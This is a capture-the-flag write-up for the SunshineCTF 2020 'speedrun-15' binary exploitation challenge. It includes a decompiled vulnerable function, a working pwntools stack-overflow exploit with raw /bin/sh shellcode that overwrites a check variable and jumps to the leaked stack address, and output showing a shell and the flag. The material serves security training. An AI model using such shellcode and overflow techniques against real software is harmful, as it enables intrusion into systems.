# **speedrun-15**
## Task
nc chal.2020.sunshinectf.org 30015
File: chall_15
Tag: binary exploitation 

## Solution

### Checksec
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```
* No canary + NX disabled + has RWX segments assume BOF shellcode
* System 64 bit

### Decompile with ghidra
```c
void vuln(void)
{
  char local_4e [10];
  int local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  int local_c;
  
  printf("There\'s a place where nothing seems: %p\n",local_4e);
  local_c = 0xdead;
  local_10 = 0xdead;
  local_14 = 0xdead;
  local_18 = 0xdead;
  local_1c = 0xdead;
  local_20 = 0xdead;
  local_24 = 0xdead;
  local_28 = 0xdead;
  local_2c = 0xdead;
  local_30 = 0xdead;
  local_34 = 0xdead;
  local_38 = 0xdead;
  local_3c = 0xdead;
  local_40 = 0xdead;
  local_44 = 0xdead;
  fgets(local_4e,0x5a,stdin);
  if ((local_44 != 0xfacade) && (local_c != 0xfacade)) {
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  return;
}
```
Just inject the shellcode into the stack

We see that the `printf` leak the `local_4e`'s address and we have to overwrite the `local_44` or `local_c` in order to ROP the return Address to the shellcode not `exit(0)` called

So we have to write out the value `0xfacade` to the `local_44` before inject the shellcode and accelerate (`stack += len(payload)`) the return address to Shellcode position

Fortunately, the limit size of `fgets` is `0x5a` still greater than total payload size. Done!
### Exploit
```python
from pwn import *

binary = context.binary = ELF('./chall_15')
p = remote('chal.2020.sunshinectf.org',30015)
p.sendline('IxZ')
p.recvuntil("There\'s a place where nothing seems: ")
stack = int(p.recvline().strip(),16)

payload = b'A'*(0x4e-0x44)
payload += p64(0xfacade)
stack += len(payload) 

#payload += asm(shellcraft.sh())
shellcode  = b'\x6a\x42\x58\xfe\xc4\x48\x99\x52'
shellcode += b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f'
shellcode += b'\x73\x68\x57\x54\x5e\x49\x89\xd0'
shellcode += b'\x49\x89\xd2\x0f\x05'
#payload += b'\x90\x90\x90\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05'
print(asm(shellcraft.sh()))
payload += shellcode
payload += b'A'*(0x4e-len(payload))
payload += p64(stack)

p.sendline(payload)
p.interactive()
```

### Output
```bash
[*] '/home/kali/speedrun_sunshineCTF2020/chall_15'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to chal.2020.sunshinectf.org on port 30015: Done
b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
[*] Switching to interactive mode
$ ls
chall_15
flag.txt
$ cat flag.txt
sun{bat-country-53036e8a423559df}
```